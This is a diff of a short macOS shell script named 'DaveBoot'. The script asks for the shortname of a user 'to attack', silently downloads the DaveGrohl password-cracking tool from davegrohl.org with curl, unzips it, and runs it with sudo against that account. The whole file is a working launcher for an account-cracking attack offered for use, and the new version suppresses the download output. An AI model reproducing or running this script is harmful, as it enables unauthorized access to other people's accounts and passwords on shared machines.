@@ -1,22 +1,14 @@
-#!/bin/sh
-clear
-echo Welcome to DaveBoot.
-echo What is the shortname for the user you would like to attack?
-read SHORTNAME
-rm ~/Desktop/DaveGrohl-2.1.zip
-rm -rf ~/Desktop/__MACOSX
-rm -rf ~/Desktop/DaveGrohl
+#!/bin/bash
+
 clear
 cd ~/Desktop
-curl -O http://davegrohl.org/DaveGrohl-2.1.zip
+read -p "Welcome to DaveBoot
+What is the shortname for the user you would like to attack? " SHORTNAME
 clear
-unzip  ~/Desktop/DaveGrohl-2.1.zip
-rm ~/Desktop/DaveGrohl-2.1.zip
-rm -rf  ~/Desktop/__MACOSX
-rm ~/Desktop/DaveBootReadme.txt
+curl -O "http://davegrohl.org/DaveGrohl-2.1.zip" > /dev/null 2>&1 
+unzip  Dave* > /dev/null 2>&1 
+rm Dave*.zip
+rm -r  __MACOSX
 clear
-echo Extraction  Successful!
-echo More information in the DaveGrohl folder on your Desktop.
-cd ~/Desktop/DaveGrohl
-echo "Open Terminal (/Applications/Utilities/Terminal) and type 'cd Desktop && sudo ./DaveGrohl/Dave -u $SHORTNAME' - You will then be asked to enter your admin password. Without an admin password, DaveGrohl will not work." > Instructions.txt
-open  ~/Desktop/DaveGrohl/Instructions.txt 
+cd Dave*
+sudo ./Dave -u "$SHORTNAME"
